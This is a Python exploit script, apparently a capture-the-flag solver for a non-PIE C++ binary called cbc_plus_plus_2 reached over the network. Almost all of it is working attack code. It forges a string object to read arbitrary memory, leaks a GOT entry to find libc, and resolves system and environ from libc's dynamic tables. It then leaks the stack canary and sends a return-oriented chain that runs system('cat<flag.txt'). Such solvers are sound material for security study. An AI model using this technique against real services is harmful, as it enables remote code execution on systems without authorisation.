#!/usr/bin/env python3
import argparse
import os
import select
import socket
import struct
import subprocess
import sys
import time

HOST = "pwn-east.cbd2026.cloud"
PORT = 9998
BIN = "./cbc_plus_plus_2"

# Binary constants; non-PIE.
ATOI_GOT = 0x406fa0
RET = 0x402d21
EXIT_PLT = 0x402440

# Stack layout from encoder() -> main().
OFF_HISTORY = 0x30
OFF_MAIN_STR = 0x50
OFF_CANARY = 0x18
MARK = 0xfeedfacedeadbeef

BAD = set(b" \t\n\r\v\f")  # std::cin >> char* stops on these; NUL is OK.


def p64(x):
    return struct.pack("<Q", x & 0xffffffffffffffff)


def u64(b):
    return struct.unpack("<Q", b[:8].ljust(8, b"\x00"))[0]


def u32(b):
    return struct.unpack("<I", b[:4])[0]


def u16(b):
    return struct.unpack("<H", b[:2])[0]


def has_bad(bs):
    return any(c in BAD for c in bs)


class Retry(Exception):
    pass


class RemoteTube:
    def __init__(self, host, port, timeout=10.0):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""
        self.timeout = timeout

    def _fill(self, n=1, timeout=None):
        end = time.time() + (timeout or self.timeout)
        while len(self.buf) < n and time.time() < end:
            try:
                chunk = self.s.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                break
            self.buf += chunk
        return len(self.buf) >= n

    def recvuntil(self, marker, timeout=None):
        end = time.time() + (timeout or self.timeout)
        while marker not in self.buf and time.time() < end:
            try:
                chunk = self.s.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                break
            self.buf += chunk
        if marker not in self.buf:
            raise EOFError(f"missing marker {marker!r}, got {self.buf[:200]!r}")
        i = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out

    def recvn(self, n, timeout=None):
        if not self._fill(n, timeout):
            raise EOFError(f"wanted {n} bytes, got {len(self.buf)}")
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def send(self, data):
        self.s.sendall(data)

    def sendline(self, data):
        self.send(data + b"\n")

    def shutdown_send(self):
        try:
            self.s.shutdown(socket.SHUT_WR)
        except OSError:
            pass

    def recvall(self, timeout=5.0):
        out = self.buf
        self.buf = b""
        self.s.settimeout(0.2)
        end = time.time() + timeout
        while time.time() < end:
            try:
                chunk = self.s.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                break
            out += chunk
            end = time.time() + timeout
        return out

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


class ProcessTube:
    def __init__(self, argv, timeout=10.0):
        self.p = subprocess.Popen(argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.buf = b""
        self.timeout = timeout

    def _read_some(self, timeout):
        fds = [self.p.stdout]
        r, _, _ = select.select(fds, [], [], timeout)
        if not r:
            return b""
        return os.read(self.p.stdout.fileno(), 65536)

    def _fill(self, n=1, timeout=None):
        end = time.time() + (timeout or self.timeout)
        while len(self.buf) < n and time.time() < end:
            chunk = self._read_some(0.05)
            if not chunk:
                if self.p.poll() is not None:
                    break
                continue
            self.buf += chunk
        return len(self.buf) >= n

    def recvuntil(self, marker, timeout=None):
        end = time.time() + (timeout or self.timeout)
        while marker not in self.buf and time.time() < end:
            chunk = self._read_some(0.05)
            if not chunk:
                if self.p.poll() is not None:
                    break
                continue
            self.buf += chunk
        if marker not in self.buf:
            err = b""
            try:
                err = self.p.stderr.read()
            except Exception:
                pass
            raise EOFError(f"missing marker {marker!r}, got {self.buf[:200]!r}, err={err[:200]!r}")
        i = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out

    def recvn(self, n, timeout=None):
        if not self._fill(n, timeout):
            raise EOFError(f"wanted {n} bytes, got {len(self.buf)}")
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def send(self, data):
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def sendline(self, data):
        self.send(data + b"\n")

    def shutdown_send(self):
        try:
            self.p.stdin.close()
        except Exception:
            pass

    def recvall(self, timeout=5.0):
        out = self.buf
        self.buf = b""
        end = time.time() + timeout
        while time.time() < end:
            chunk = self._read_some(0.05)
            if chunk:
                out += chunk
                end = time.time() + timeout
                continue
            if self.p.poll() is not None:
                # grab stderr too; useful for local debugging, harmless for remote-less mode
                try:
                    out += self.p.stderr.read()
                except Exception:
                    pass
                break
        return out

    def close(self):
        try:
            self.p.kill()
        except Exception:
            pass


def start(args):
    if args.local:
        return ProcessTube([args.bin])
    return RemoteTube(args.host, args.port)


def build_leak_payload(addr, size):
    # choice "0" => Invalid; reset vector object to {0,0,0}; forge main_str.
    payload = b"0" + b"A" * (OFF_HISTORY - 1)
    payload += b"\x00" * 24          # main::history = empty vector; push_back reallocates safely
    payload += b"B" * 8               # gap between history and main_str
    payload += p64(addr) + p64(size) + p64(MARK) + p64(0)
    if len(payload) != OFF_MAIN_STR + 0x20:
        raise AssertionError("bad leak payload length")
    if has_bad(payload):
        raise Retry("leak payload contains whitespace badchar; retry ASLR")
    return payload


def do_leak(io, addr, size):
    if size == 0:
        return b""
    io.sendline(build_leak_payload(addr, size))
    io.recvuntil(b"Invalid\n")
    data = io.recvn(size)
    io.recvuntil(b"> ")
    return data


def safe_leak(io, addr, size, lower_bound=0):
    """Leak [addr, addr+size) even when addr itself has a whitespace byte.
       It starts slightly before addr with a safe pointer and slices locally.
    """
    if size <= 0:
        return b""
    # Keep this moderate; the caller chunks large reads.
    for delta in [0] + list(range(1, 0x1000)):
        start = addr - delta
        total = size + delta
        if start < lower_bound or total > 0x3000:
            continue
        if not has_bad(p64(start)) and not has_bad(p64(total)):
            blob = do_leak(io, start, total)
            return blob[delta:delta + size]
    raise Retry(f"could not encode leak pointer for {addr:#x}")


def find_elf_base(io, ptr):
    page = ptr & ~0xfff
    # atoi is inside libc; scanning down mapped libc pages is safe until the ELF header.
    for i in range(0x900):
        addr = page - i * 0x1000
        if has_bad(p64(addr)):
            continue
        try:
            if do_leak(io, addr, 4) == b"\x7fELF":
                return addr
        except EOFError:
            raise Retry("process died while scanning libc base")
    raise Retry("libc base not found; likely skipped a badchar base, retry")


def parse_libc(io, base):
    def mem(addr, size):
        out = b""
        while size:
            take = min(size, 0x1800)
            out += safe_leak(io, addr, take, base)
            addr += take
            size -= take
        return out

    eh = mem(base, 0x40)
    if eh[:4] != b"\x7fELF":
        raise Retry("bad ELF header")
    e_phoff = u64(eh[0x20:0x28])
    e_phentsize = u16(eh[0x36:0x38])
    e_phnum = u16(eh[0x38:0x3a])
    ph = mem(base + e_phoff, e_phentsize * e_phnum)

    loads = []
    dyn_addr = None
    dyn_size = None
    for i in range(e_phnum):
        ent = ph[i * e_phentsize:(i + 1) * e_phentsize]
        p_type = u32(ent[0:4])
        p_flags = u32(ent[4:8])
        p_vaddr = u64(ent[0x10:0x18])
        p_filesz = u64(ent[0x20:0x28])
        p_memsz = u64(ent[0x28:0x30])
        if p_type == 1:  # PT_LOAD
            loads.append((base + p_vaddr, p_memsz, p_flags))
        elif p_type == 2:  # PT_DYNAMIC
            dyn_addr = base + p_vaddr
            dyn_size = p_memsz or p_filesz
    if dyn_addr is None:
        raise Retry("no PT_DYNAMIC found")

    dyn = mem(dyn_addr, dyn_size)
    D = {}
    for off in range(0, len(dyn), 16):
        tag = u64(dyn[off:off + 8])
        val = u64(dyn[off + 8:off + 16])
        if tag == 0:
            break
        D.setdefault(tag, []).append(val)

    def dptr(tag):
        val = D[tag][0]
        return val if val >= base else base + val

    strtab = dptr(5)       # DT_STRTAB
    symtab = dptr(6)       # DT_SYMTAB
    strsz = D.get(10, [0])[0]  # DT_STRSZ

    # Determine dynsym count from GNU hash, falling back to SysV hash.
    if 0x6ffffef5 in D:  # DT_GNU_HASH
        gnu_hash = dptr(0x6ffffef5)
        hdr = mem(gnu_hash, 16)
        nbuckets, symoffset, bloom_size, _ = struct.unpack("<IIII", hdr)
        buckets_addr = gnu_hash + 16 + 8 * bloom_size
        buckets = mem(buckets_addr, 4 * nbuckets)
        max_sym = 0
        for i in range(nbuckets):
            b = u32(buckets[4 * i:4 * i + 4])
            if b > max_sym:
                max_sym = b
        if max_sym < symoffset:
            sym_count = symoffset
        else:
            idx = max_sym
            chains_addr = buckets_addr + 4 * nbuckets
            while True:
                val = u32(mem(chains_addr + 4 * (idx - symoffset), 4))
                if val & 1:
                    break
                idx += 1
            sym_count = idx + 1
    elif 4 in D:  # DT_HASH
        h = mem(dptr(4), 8)
        sym_count = u32(h[4:8])
    else:
        raise Retry("no hash table found")

    strings = mem(strtab, strsz)
    syms = mem(symtab, sym_count * 24)
    wanted = {b"system", b"environ", b"__environ", b"_environ"}
    symbols = {}
    for i in range(sym_count):
        st = syms[24 * i:24 * (i + 1)]
        name_off = u32(st[0:4])
        if name_off >= len(strings):
            continue
        end = strings.find(b"\x00", name_off)
        if end < 0:
            continue
        name = strings[name_off:end]
        if name in wanted:
            st_value = u64(st[8:16])
            symbols[name.decode()] = base + st_value

    if "system" not in symbols:
        raise Retry("system not found")
    environ_sym = symbols.get("__environ") or symbols.get("environ") or symbols.get("_environ")
    if not environ_sym:
        raise Retry("environ symbol not found")

    # Find a pop rdi; ret gadget in executable libc pages, choosing one encodable in stdin.
    pop_rdi = None
    for seg_addr, seg_size, flags in loads:
        if not (flags & 1):  # PF_X
            continue
        off = 0
        while off < seg_size:
            take = min(0x2000, seg_size - off)
            chunk = mem(seg_addr + off, take)
            pos = 0
            while True:
                j = chunk.find(b"\x5f\xc3", pos)
                if j < 0:
                    break
                cand = seg_addr + off + j
                if not has_bad(p64(cand)):
                    pop_rdi = cand
                    break
                pos = j + 1
            if pop_rdi:
                break
            off += max(1, take - 1)
        if pop_rdi:
            break
    if not pop_rdi:
        raise Retry("no encodable pop rdi; ret found")

    return symbols, environ_sym, pop_rdi, loads, mem


def locate_main_string(io, env_ptr):
    # The fake main_str object is on the current stack.  Each leak sets it to
    # (target, chunk_size, MARK), so when the leaked stack chunk covers it,
    # that exact tuple appears in the output.
    top = env_ptr & ~0xfff
    chunk_size = 0x20000
    step = 0x10000
    max_scan = 0x1000000

    for off in range(0, max_scan, step):
        base_target = top + 0x1000 - chunk_size - off
        targets = [base_target]
        # If the natural target has bad chars, try nearby addresses; overlap covers gaps.
        targets += [base_target + d for d in (1, 0x10, 0x100, 0x1000) if base_target + d < top + 0x1000]
        for target in targets:
            if has_bad(p64(target)) or has_bad(p64(chunk_size)):
                continue
            try:
                data = do_leak(io, target, chunk_size)
            except EOFError:
                raise Retry("process died during stack scan")
            pat = p64(target) + p64(chunk_size) + p64(MARK)
            j = data.find(pat)
            if j != -1:
                return target + j
    raise Retry("main_str stack object not found")


def attempt(args, attempt_no=1):
    io = start(args)
    try:
        io.recvuntil(b"Enter string: ")
        io.sendline(b"AAAA")
        io.recvuntil(b"> ")

        atoi_addr = u64(do_leak(io, ATOI_GOT, 8))
        if args.verbose:
            print(f"[+] atoi = {atoi_addr:#x}")

        libc_base = find_elf_base(io, atoi_addr)
        if args.verbose:
            print(f"[+] libc base = {libc_base:#x}")

        symbols, environ_sym, pop_rdi, _loads, mem = parse_libc(io, libc_base)
        system = symbols["system"]
        env_ptr = u64(safe_leak(io, environ_sym, 8, libc_base))
        if args.verbose:
            print(f"[+] system = {system:#x}")
            print(f"[+] environ@libc = {environ_sym:#x}, environ = {env_ptr:#x}")
            print(f"[+] pop rdi ; ret = {pop_rdi:#x}")

        main_str = locate_main_string(io, env_ptr)
        canary_addr = main_str + 0x28
        canary = u64(safe_leak(io, canary_addr, 8, main_str - 0x1000))
        if canary & 0xff != 0:
            raise Retry(f"bad canary leak {canary:#x}")

        main_rbp = main_str + 0x40
        buf_addr = main_str - 0x50
        if args.verbose:
            print(f"[+] main_str = {main_str:#x}")
            print(f"[+] canary = {canary:#x}")
            print(f"[+] buf = {buf_addr:#x}")

        # Half-close stdin to make cin.good() false after extracting this token.
        # That skips history.push_back(), returns from encoder(), passes the canary,
        # and executes the ROP chain.  Use shell redirection to avoid spaces.
        cmd = b"cat<flag.txt\x00"
        chain = [RET, pop_rdi, 0, system, EXIT_PLT]
        cmd_addr = buf_addr + 0x28 + 8 * len(chain)
        chain[2] = cmd_addr

        payload = b"0" + b"A" * (OFF_CANARY - 1)
        payload += p64(canary)
        payload += p64(main_rbp)
        payload += b"".join(p64(x) for x in chain)
        payload += cmd

        if has_bad(payload):
            raise Retry("final payload has whitespace badchar; retry ASLR")

        io.send(payload)
        io.shutdown_send()
        out = io.recvall(timeout=6.0)
        return out
    finally:
        io.close()


def main():
    ap = argparse.ArgumentParser(description="Solver for cbc_plus_plus_2")
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--port", default=PORT, type=int)
    ap.add_argument("--bin", default=BIN)
    ap.add_argument("--local", action="store_true", help="run local binary instead of remote")
    ap.add_argument("--tries", default=20, type=int)
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    last = None
    for i in range(1, args.tries + 1):
        try:
            if args.verbose:
                print(f"[*] attempt {i}/{args.tries}")
            out = attempt(args, i)
            sys.stdout.buffer.write(out)
            if b"flag" in out.lower() or b"{" in out:
                return
        except (Retry, EOFError, OSError, BrokenPipeError) as e:
            last = e
            if args.verbose:
                print(f"[-] retry: {e}")
            continue
    print(f"[-] failed after {args.tries} tries; last error: {last}", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
